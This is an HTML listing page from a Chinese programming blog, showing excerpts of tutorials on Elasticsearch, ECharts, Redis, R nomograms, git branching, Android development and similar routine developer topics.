<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/031cc5c7fd56c91c63881e64a3262135/" rel="bookmark">
			ElasticSearch Java整合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pom.xml
&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.elasticsearch&lt;/groupId&gt; &lt;artifactId&gt;elasticsearch&lt;/artifactId&gt; &lt;version&gt;7.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- elasticsearch 的客户端 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt; &lt;artifactId&gt;elasticsearch-rest-high-level-client&lt;/artifactId&gt; &lt;version&gt;7.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- elasticsearch 依赖 2.x 的 log4j --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.8.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.8.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.3&lt;/version&gt; &lt;/dependency&gt; &lt;!-- junit 单元测试 --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; elasticsearch 的两个依赖要和 elasticsearch 服务器版本一致。
#客户端对象 建好项目，创建一个类，测试连接 ES 服务器
public class ESTest_Client { public static void main(String[] args) throws IOException { //创建ES客户端 RestHighLevelClient esClient = new RestHighLevelClient( RestClient.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/031cc5c7fd56c91c63881e64a3262135/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47eaf6d51541c7ddde803ccce1a2e17d/" rel="bookmark">
			vue中使用echarts实现省市地图绘制，根据数据显示不同区域颜色，点击省市切换，根据经纬度打点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实现效果 使用echarts实现省市地图绘制根据数据不同显示不同区域颜色实现省市地图点击切换效果实现地图上根据经纬度打点 二、实现方法 1、安装echarts插件 npm install echarts --save 2、获取省市json数据 https://datav.aliyun.com/portal/school/atlas/area_selector
通过 阿里旗下的高德地图提供的api ，可以获取到中国各个省份/区级/县级的json数据，但是区级和县级，并没有包含街道和乡镇的数据。
3、地图经纬度数据 经度和纬度常合称为经纬度，把地球球面上的经纬度显示在平面地图上需要采用某种地图投影。
与之相关的地理坐标系一般是指由经度、纬度和相对高度组成的坐标系，能够标示地球上的任何一个位置。
http://jingweidu.757dy.com/
4、本例中data 数据 本文以吉林省地图为例，来实现吉林省及所有市的切换效果。
&lt;template&gt; &lt;div class="center-body"&gt; &lt;div class="map" id="map"&gt;&lt;/div&gt; &lt;div class="rest-button" v-if="showButton" @click="reChinaMap()"&gt;返回吉林省&lt;/div&gt; &lt;/div&gt; &lt;/template&gt; 导入插件
import * as echarts from "echarts"; 准备数据
export default { data() { return { showButton: true,//是否显示返回按钮 currentCity: "",//当前城市 // 市json数据名称 province: { "长春市": "changchunshi", "吉林市": "jilinshi", "通化市": "tonghuashi", "四平市": "sipingshi", "白山市": "baishanshi", "辽源市": "liaoyuanshi", "白城市": "baichengshi", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47eaf6d51541c7ddde803ccce1a2e17d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1662b59b1d40f1625ddf185aaff03d9/" rel="bookmark">
			计算列线图得分并进行危险分层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		列线图是模型的图形化表达方式，通过列线图可以计算直观的看出某个患者的得分，方便分析患者的风险。关于列线图，我们介绍过很多次了，公众号后台回复列线图即可获取合集链接：
Cox回归列线图（nomogram）的4种绘制方法Logistic回归列线图的4种绘制方法限制性立方样条（RCS）的列线图怎么画？列线图的本质Fine-Gray检验、竞争风险模型、列线图绘制列线图增加彩色风险分层条带 有粉丝问如何根据列线图得分进行危险分层，其实思路很简单，先计算每个患者的得分，然后根据最佳截断值进行分层即可。这个最佳截断值，我们也介绍过非常多的方法了，公众号后台回复最佳截点，即可获取合集链接：
R语言生存分析的实现生存分析最佳截断值的确定最佳截断值之cutoffROC曲线最佳截点 准备数据 使用R包自带数据。
library(survival) library(rms) ## Loading required package: Hmisc ## Loading required package: lattice ## Loading required package: Formula ## Loading required package: ggplot2 ## ## Attaching package: 'Hmisc' ## The following objects are masked from 'package:base': ## ## format.pval, units ## Loading required package: SparseM ## ## Attaching package: 'SparseM' ## The following object is masked from 'package:base': ## ## backsolve rm(list = ls()) dim(lung) ## [1] 228 10 str(lung) ## 'data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1662b59b1d40f1625ddf185aaff03d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23c8f28096ed5ca1a86dc6f5579df322/" rel="bookmark">
			数学符号[-1,1]^{5}符号的含义是什么呢
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3eee48364f8d092e2aab4d21b6d7ce5/" rel="bookmark">
			竞争风险模型的列线图和校准曲线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前介绍过一次竞争风险模型：Fine-Gray检验、竞争风险模型、列线图绘制。
主要是借助cmprsk这个包实现的，并且列线图的绘制也是间接实现的。
今天介绍的QHScrnomo依赖于rms，cmprsk,Hmisc等包，是专门用于竞争风险模型的列线图绘制，除此之外还可以建立模型、绘制校准曲线、进行内外部验证等。
文章目录 安装准备数据拟合竞争风险模型内部验证计算C-index校准曲线列线图生成模型方程外部验证（测试集）参考资料 安装 2选1：
devtools::install_github("ClevelandClinicQHS/QHScrnomo") install.packages("QHScrnomo") 准备数据 使用casebase中的bmtcrr数据，只使用其中的一部分，并且把字符型变成因子型。
library(QHScrnomo) ## Loading required package: rms ## Loading required package: Hmisc ## Loading required package: lattice ## Loading required package: survival ## Loading required package: Formula ## Loading required package: ggplot2 ## ## Attaching package: 'Hmisc' ## The following objects are masked from 'package:base': ## ## format.pval, units ## Loading required package: SparseM ## ## Attaching package: 'SparseM' ## The following object is masked from 'package:base': ## ## backsolve data("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d3eee48364f8d092e2aab4d21b6d7ce5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/047d25fade84be6012f40f2560245963/" rel="bookmark">
			Redis RDB与AOF持久化、RESP 协议和ReWrite重写缩减体积
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Redis 的 RDB 持久化机制简单直接，把某一时刻的所有键值对以二进制的方式写入到磁盘，特点是恢复速度快，尤其适合数据备份、主从复制场景。但如果你的目的是要保证数据可靠性，RDB 就不太适合了，因为 RDB 持久化不宜频繁触发，如果 Redis 触发 RDB 后又有新的数据写入，且还没来得及触发下一次 RDB 就宕机了，中间的数据就会丢失。
在这种场景下，我们就急需一种增量备份的方式，只记录上一次 RDB 到现在为止所有的变更记录就好了，相较于全量备份，增量备份的数据量就小得多了。所以，Redis 还提供了 AOF 持久化机制。
RDB 二进制 高效 体积小AOF 文本 低效 体积大 特性RDBAOF文件格式二进制文本内存效率高较低恢复速度快慢文件大小小大运行效率高低 Redis 会把服务端执行的所有写命令，以 RESP 协议的方式追加到 AOF 日志文件中，数据恢复时只要读取 AOF 文件，重放所有的日志即可。
AOF持久化 ① 开启AOF 开启 AOF 你需要关心下面几个参数：
#开启AOF
appendonly yes
appendfilename "appendonly.aof" #AOF文件名
#AOF文件刷盘策略
appendfsync always
# appendfsync everysec
# appendfsync no
#AOF触发机制
auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb
#是否开启RDB前导 混合持久化
aof-use-rdb-preamble yes
AOF刷盘策略 appendfsync 配置 AOF 文件刷盘策略：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/047d25fade84be6012f40f2560245963/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89f341f33a77c8f63c85da1c1eb91db8/" rel="bookmark">
			JavaScript 函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 函数定义2. 命名空间2.1 简单介绍2.2 使用场景分析 1. 函数定义 1. 通用函数声明，不会立即调用，在使用的时候使用函数名调用 2. 通过表达式进行定义，使用变量名进行调用 3. 自调用函数，函数会自己自动调用(匿名函数, 不能进行声明或者定义) 4. 函数在Js当中视为对象(拥有属性和方法) 5. 箭头函数(默认绑定外层this值) 补充：函数表达式监视使用const代替var，常量更加安全 // 1. 通用函数声明，不会立即调用，在使用的时候使用函数名调用 function Myfunction(word) { console.log(word); } Myfunction("hello, word"); // 2. 通过表达式进行定义，使用变量名进行调用 var Myfunction = function (word) { console.log(word); } Myfunction("hello, word"); // 3. 自调用函数，函数会自己自动调用，自身添加括号,声明其为函数表达式，紧跟()则会自动调用 (function () { console.log("hello"); })(); // 4. 函数在Js当中视为对象 function myFunction(word){ console.log(word); }; console.log(myFunction.length); console.log(myFunction.toString()); // 5. 箭头函数 // (参数1, 参数2, …, 参数N) =&gt; { 函数声明 } // 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89f341f33a77c8f63c85da1c1eb91db8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfeda9cd9c7878139e9937776945080d/" rel="bookmark">
			信息分类检索工具（RocketQA）的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、背景 我们所处是一个信息爆炸的时代，无论是工作还是生活中，我们每天都要收到来自同事、朋友等很多信息和资料，即便我们很好的管理了这些信息，但由于信息量过于庞大，我们寻找起来也非常的麻烦。此时如果有一款信息分类和检索很好的工具，那么我们就可快速的进行提问找到我们想找到的信息。
此时，RocketQA就可大放异彩，因为RocketQA就是应对这种痛点，出生的技术，接下里我们了解一下RocketQA的一些操作。
二、使用方法 2.1.环境准备 RocketQA的使用其实也是非常的简单，首先，我们需要准备对应的环境，RocketQA基于Python3环境，这里推荐安装Anaconda，因为这个Anaconda它是一个管理Python相关包的软件，自带Python，Jupyter Notebook、Spyder，还有管理包conda工具，所以推荐直接安装Anaconda。
因为RocketQA是百度出品，它是基于百度深度学习模型语言paddlepaddle，所以首先要安装paddlepaddle
# GPU version: $ pip install paddlepaddle-gpu # CPU version: $ pip install paddlepaddle 如果我们不需要源码运行，我们可以直接通过python安装RocketQA的发布包
$ pip install rocketqa 如果我们要源码裕兴RocketQA，我们需要从github中将RocketQA下载下来 https://github.com/PaddlePaddle/RocketQA.git
git clone https://github.com/PaddlePaddle/RocketQA.git 注意基于python环境为Python3.6+ 并且paddlepaddle 2.0+，在选择安装版本的时候需要注意。
2.2.运行RocketQA模式简介 RocketQA 提供了多种运行模式包括JINA、FAISS、并且它还对外提供了多种API，供外部接口，可以提供给第三方系统调用RocketQA的服务，接下来我们就看一下如何进行使用
2.3.RocketQA和JINA配合搭建快速搜索模式 JINA是一个云原生神经网络搜索框架，可快速构建深度学习搜索程序。它可以与RocketQA进行配合构建出一个功能齐全的搜索应用，下面是一个基于JINA和RocketQA构建搜索引擎的示例
cd examples/jina_example pip3 install -r requirements.txt # Generate vector representations and build a libray for your Documents # JINA will automaticlly start a web service for you python3 app.py index toy_data/test.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfeda9cd9c7878139e9937776945080d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/664061696b55888de7e994eb98f54829/" rel="bookmark">
			工业相机的帧率和曝光（快门）之间的关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 项目场景2 技术背景3 帧率和快门时间计算方式 1 项目场景 工业相机是常用与工业视觉领域的常用专业视觉核心部件，拥有多种属性，是机器视觉系统中的核心部件，具有不可替代的重要功能。
工业相机已经被广泛应用于工业生产线在线检测、智能交通,机器视觉,科研,军事科学,航天航空等众多领域
工业相机的主要参数包括:分辨率、帧率、像素、像元尺寸、光谱响应特性等，本文主要介绍工业相机的帧率和它的曝光之间的关系。
工业相机帧率：相机采集传输图像的速率,对于面阵相机一般为每秒采集的帧数(Frames/Sec.),对于线阵相机为每秒采集的行数(Hz)。
工业相机曝光：曝光是图像传感器进行感光的一个过程，相机曝光时间，也就是快门速度，曝光即曝光时间控制，控制感光元件上总的光通量。曝光越大，光通量越大。在数码相机中，可以采用电子快门，也可以采用传统的机械快门。快门速度和光圈大小是互补的。
2 技术背景 在工业相机中，帧率和曝光是相互依存的参数，影响着拍摄图像的质量。
帧率是指工业相机在一秒钟内捕获的视频帧的数量。它对于需要实时视频监控或快速移动物体跟踪的应用非常重要。更高的帧率可以提供更流畅的视频播放，但可能会减少曝光时间，并影响图像的亮度和清晰度。
另一方面，曝光决定了相机传感器捕捉到的光量。较长的曝光时间允许更多的光线进入传感器，产生更明亮的图像，但如果相机或场景中的物体在移动，也可能引入运动模糊或图像噪音。
因此，设置最佳帧率和曝光需要在为实时应用捕捉足够的帧数和获得足够的光量以获得清晰的图像质量之间找到最佳平衡。根据具体的应用要求，不同的工业相机可能有不同的调整帧率和曝光的能力和设置。
本文将以Baumer工业相机作为案例研究工业相机帧率和曝光之间的关系。
3 帧率和快门时间计算方式 工业相机的帧率和曝光快门时间之间的计算是基于以下公式。
快门时间=1/帧率
例如，如果工业相机的帧率是每秒30帧（fps），那么快门时间的计算方法是：。
快门时间 = 1 / 30帧 = 0.0333秒=33.3毫秒=33300微秒
相反，如果所需的快门时间是已知的，相应的帧率可以使用相同的公式计算。
注意：这种计算方式是基于最基础的数学公式来计算的，可以作为参考，工业相机实际的帧率涉及的因素较多，一般以实际测试结果为准。
很多工程技术人员对于工业相机可能会有下面类似疑问
是否可以简单通过曝光快门时间计算出相机帧率？
不可能简单地从快门时间计算出工业相机的帧率，因为帧率取决于各种因素，如曝光时间、读出时间、图像传输率和相机接口带宽。
帧率可以通过用每秒拍摄的帧数除以曝光时间加上读出时间来计算。
此外，相机规格表或手册通常提供给定相机配置的最大可实现的帧率，这对确定相机的整体性能很有用。
https://blog.csdn.net/xianzuzhicai/article/details/129483022
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/563ea4277902b3237164df535e6057d1/" rel="bookmark">
			ssl证书问题导致本地启动前端服务报500
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 报错如下：注意查看报错信息
问题：系统原是http，后台调整为https后，ssl证书有点问题， vue项目本地服务，使用代理，webpack默认，证书强校验，导致请求无法发出，后台日志也无反应。
module.exports = { dev: { // Paths assetsSubDirectory: 'static', assetsPublicPath: '/', proxyTable: { '/port': { target: config.TARGET, changeOrigin: true, secure: false, // 关闭强校验 pathRewrite: { '^/port': '' } } }, 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0eebf2e2356ba2d080bfdafc22593ba5/" rel="bookmark">
			Ubuntu20.04开机卡在logo界面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 具体表现解决方法 具体表现 由于最近在做仿真模拟，所以就顺手安装了显卡驱动在之后的使用过程中，笔记本风扇一直在响，所以开始鼓捣控制显卡风扇的东西结果就无法启动了，一直卡在logo界面并且，自从安装显卡驱动之后，会出现卡机卡在logo界面，需要二次重启，但今天二次重启也不行 解决方法 就是卸载显卡驱动使用启动盘进行引导修复的方法，亲测是在浪费时间具体卸载步骤 在开机进入引导栏后，选择 “advanced options for ubuntu recovery mode” （也就是第二项）再次选择第二项，也就是带有括号，里面有 “recovery” 字样的一项按向下按键，选择 “root” 一行，按 Enter 确认此时进入命令行，在左下角可以看到输入界面，按 Enter 确认进入依次输入以下命令 sudo apt-get --purge remove nvidia* sudo apt autoremove reboot 注：reboot 是重启计算机，前两个命令是卸载 NVIDIA 显卡驱动
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e8223b0ca768c5932586eef06945f84/" rel="bookmark">
			git的分支的使用，创建分支，合并分支，删除分支，合并冲突，分支管理策略，bug分支，强制删除分支
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GIT | 分支 文章目录 GIT | 分支创建分支合并分支删除分支合并冲突分支管理策略bug分支强制删除分支 创建分支 查看当前本地仓库中有哪些分支
git branch HEAD所指向的分支就是当前正在工作的分支
cat .git/HEAD 创建一个分支
git branch dev 创建好了，但是目前还是指向master
用tree命令也可以看到已经创建分支成功了
创建出来的分支，和主分支的最新记录是一样的
切换分支就是让HEAD指向我们的dev分支
git checkout dev 我们在dev分支上堆ReadMe文件进行了修改
再进行提交
这个时候再切换回master分支
查看文件
可以看到刚刚新加的那行文件不见了~~
那我们再切换回dev分支上看
发现那行新加的还在
我们查看这里发现已经变了
我们查看记录
dev上是最新的记录，master分支第二
我们最终的效果是在master分支上看到我们的效果，我们怎么操作呢？
合并分支 这就要我们合并分支，在合并分支之前就需要先切换到我们master分支上
git merge dev 删除分支 只能在其他的分支上删除本分支
git branch -d dev 合并冲突 在合并分支的时候，我们在master分支上已经修改了文件，而我在dev分支上也修改了文件，然后合并的时候就会出现报错，我们来演示一下
快速创建分支并且进入分支
git checkout -b dev1 我们将原来的aaa改成了bbb
然后提交上去
我们切换到master分支上查看一下文件内容，发现还是aaa，因为还没有合并
接下来我们就继续将这个aaa改成ccc，然后再进行合并分支
这个时候再进行合并，会提示合并冲突
git merge dev1 我们打开ReadMe文件查看一下
这个时候就要手动选择要保留哪些代码
假设我们就保留这些代码
然后再进行提交
查看是否是最新提交
可视化的查看方法
git log --graph --abbrev-commit 分支管理策略 不使用Fast forward模式
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e8223b0ca768c5932586eef06945f84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28a1e3bcbda5e4c244362da026c08530/" rel="bookmark">
			国产系统适配碰到的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		国产系统适配碰到的问题 第一个 统信UOS桌面系统 自带浏览器和统信Chrome，对replaceAll String字符串的替换方法不支持。
解决方法如下：
autoReplenish.js
(function () { console.log('执行了all') if(typeof(String().replaceAll) !=="function"){ String.prototype.replaceAll = function(a,b){ return String(this).replace(new RegExp( a,'g'),b) } } })(window) 如是vue，react, 引入到项目的index.html页面中。
待续
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05c22ea42f7ea7739c77025bb63551ec/" rel="bookmark">
			【css】划过滚动条，滚动条加宽，划出时，变回原宽度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 // 全局的滚动条样式 ::-webkit-scrollbar {	//滚动条的宽度 width: 4px; height: 6px; } ::-webkit-scrollbar-thumb {	//滚动条的滑块 background-color: rgba(144, 147, 153, 0.6); border-radius: 4px; } // 内容区滚动条划过加宽 .content&gt;div&gt;div::-webkit-scrollbar {	// 内容区的滚动条宽度 width: 8px; height: 8px; } .content&gt;div&gt;div::-webkit-scrollbar-thumb {	// 内容区的滚动条滑块样式，这个是重点 background-color: rgba(144, 147, 153, 0.6); border-radius: 4px; border-style: dashed; border-color: transparent; border-width: 2px; background-clip: padding-box; } .content&gt;div&gt;div::-webkit-scrollbar-thumb:hover {	// 内容区滚动条滑块划过样式 background: rgba(144, 147, 153, 0.6); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9cb79d0e4d919b0cbba8876dbec1f38/" rel="bookmark">
			IDEA常用高效开发工具——screw一键生成数据库文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		screw [介绍：一键生成数据库文档，从此告别人工整理文档] a:数据库支持： MySQLMariaDBTIDBOracleSqlServerPostgreSQLCache DB b:配置 引入screw核心包，HikariCP数据库连接池。
&lt;!-- screw核心 --&gt; &lt;dependency&gt; &lt;groupId&gt;cn.smallbun.screw&lt;/groupId&gt; &lt;artifactId&gt;screw-core&lt;/artifactId&gt; &lt;version&gt;1.0.3&lt;/version&gt; &lt;/dependency&gt; &lt;!-- HikariCP --&gt; &lt;dependency&gt; &lt;groupId&gt;com.zaxxer&lt;/groupId&gt; &lt;artifactId&gt;HikariCP&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt; &lt;/dependency&gt; &lt;!--mysql driver--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.20&lt;/version&gt; &lt;/dependency&gt; c: 编写工具类 直接从gitee获取：注意选择“screwdome”分支！screwdome: screwdome：以SpringBoot为基础集成整合screw，方便生成数据库文档！ (gitee.com) 需要导入的包，不要导入错了： public class screwStart{ public static void main(String[] args) { // 数据源 HikariConfig hikariConfig = new HikariConfig(); hikariConfig.setDriverClassName("com.mysql.cj.jdbc.Driver"); hikariConfig.setJdbcUrl("数据库-地址"); hikariConfig.setUsername("数据库-用户名"); hikariConfig.setPassword("数据库-密码"); // 设置可以获取tables remarks信息 hikariConfig.addDataSourceProperty("useInformationSchema", "true"); hikariConfig.setMinimumIdle(2); hikariConfig.setMaximumPoolSize(5); DataSource dataSource = new HikariDataSource(hikariConfig); // 生成配置 EngineConfig engineConfig = EngineConfig.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9cb79d0e4d919b0cbba8876dbec1f38/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c023b26780ff6a21380591119047bb6/" rel="bookmark">
			Android Studio如何实现 购物商城 案例（简单易上手）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是一个使用Android Studio和Java开发的购物商城应用。该应用旨在提供用户一个方便、快捷的购物体验。通过该应用，用户可以浏览不同类别的商品，并将其添加到购物车中。用户可以查看商品的详细信息，包括价格等。购物商城应用还提供了用户注册和登录功能，以便用户可以保存个人信息。该应用还支持商品搜索功能，帮助用户快速找到所需商品。购物商城应用的界面简洁、直观，操作易于上手，为用户提供了一个愉快的购物体验。
目录
一、项目概述
1、构成以及功能设计
二、开发环境
三、准备工具
四、详细设计
1、新建工程
2、搭建启动页面
3、搭建注册、登陆界面
4、搭建主页界面
5、搭建购物车界面
6、搭建我的页面
五、项目运行
1.图片演示
2.视频演示
六、项目总结
七、源码下载
一、项目概述 1、构成以及功能设计 ①启动页
②.用户登录/注册功能
③主页面功能
- 顶部轮播图功能
- 搜索功能
- 商品目录
- 商品列表
-点击商品列表进入详情页
④ 购物车功能
- 商品数量的增加减少
- 商品支付购买
⑤ 我的页面
- 修改用户密码
⑥详情页面
- 显示商品详情信息
二、开发环境 我的开发环境如下，大家的AS版本不需要和我相同，只要是近两年从官网下载的版本，都是比4.0.0高的，是可以满足运行和开发要求的。
三、准备工具 准备商品详情内容
四、详细设计 1、新建工程 首先打开Android Studio，并新建一个工程，File——&gt;New——&gt;New Project——&gt;Empty Project，工程名称叫做NewShop，可以根据自己喜好设置名称。
包名自己随意设定，这里博主用的是com.example，一般是com.example；工程文件的保存路径要修改一下，不要放在C盘，我这里选择的是放在H盘，养成项目统一放在英文路径下的好习惯。
最后选择API 24：Android 7.0，因为这样它就拥有了96.3%的跨平台性（兼容性非常好），因为它版本很低，基本上模拟器API版本都是高于20的，所以这个软件可以运行其他各种设备上。点击Finish完成创建。
2、搭建启动页面 我们来看一下activity_start布局文件。
启动页面xml完整代码如下：
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:tools="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c023b26780ff6a21380591119047bb6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ea0d4a48f1bbabb205b8eca3bb07915/" rel="bookmark">
			std::iota 函数简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		std::iota 是 C++ 标准库中的一个算法，位于 &lt;numeric&gt; 头文件中。它的作用是用一个连续的范围内的递增序列填充容器。
函数签名如下：
template&lt; class ForwardIt, class T &gt; void iota( ForwardIt first, ForwardIt last, T value ); 其中：
first 是要填充的范围的起始迭代器。last 是要填充的范围的末尾迭代器（不包括末尾）。value 是起始值，std::iota 会从 value 开始生成递增的值。 以下是一个简单的示例，说明了 std::iota 的用法：
#include &lt;iostream&gt; #include &lt;numeric&gt; #include &lt;vector&gt; int main() { std::vector&lt;int&gt; numbers(5); // 创建一个包含5个元素的 vector std::iota(numbers.begin(), numbers.end(), 1); // 从1开始填充递增序列 for (const auto&amp; num : numbers) { std::cout &lt;&lt; num &lt;&lt; " "; } return 0; } 在这个示例中，std::iota 将从1开始生成递增的整数，并填充到 numbers 容器中。输出将是 1 2 3 4 5。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/082d1afa2b768a376ebb5aaab753f7e2/" rel="bookmark">
			Android RecycleView实现平滑滚动置顶和调整滚动速度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、滑动到指定位置（target position）并且置顶
1. RecycleView默认的几个实现方法及缺陷
2. 优化源码实现置顶方案
二、调整平移滑动速率
三、其他方案：置顶、置顶加偏移、居中
1. 其他置顶方案
2. 置顶加偏移
3. 滚动居中
在实际项目里，RecycleView 可以说是我们最常用到的组件，作为绑定并展示LIST数据的组件，经常需要实现平滑滚动到列表里的某个目标ITEM，并且将其置顶在屏幕最上方，而且在特殊情形下，我们需要控制滑动速度，来控制滚动的时长。
一、滑动到指定位置（target position）并且置顶 1. RecycleView默认的几个实现方法及缺陷 ((LinearLayoutManager)recycleView.getLayoutManager()).scrollToPositionWithOffset(int position, int offset);
如果你没有滑动过程动画的要求，那上面这行代码将offset的值设置为0，就一步到位地满足需求了。
recycleView.scrollToPosition(int position);
recycleView.smoothScrollToPosition(int position);
以上两个方法遵循的是最少滑动原则，只要target position那项item已经完全可见了，就马上停止滑动；要是target position已经可见了，那根本不会滑动。所以按不同的滑动方向，会出现不同的结果，如果target position在屏幕可视范围的上方，则它默认会将target position置顶；反之，target position在屏幕可视范围的下方，则滚动完成后，target postion会处于屏幕的最下方，无法实现我们的置顶需求。所以缺陷很明显：要么不动，要么无法置顶。
2. 优化源码实现置顶方案 我们看下recycleview提供的方法的源代码，看看是否可以进行改进：
public void smoothScrollToPosition(int position) { if (mLayoutSuppressed) { return; } if (mLayout == null) { Log.e(TAG, "Cannot smooth scroll without a LayoutManager set. " + "Call setLayoutManager with a non-null argument.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/082d1afa2b768a376ebb5aaab753f7e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
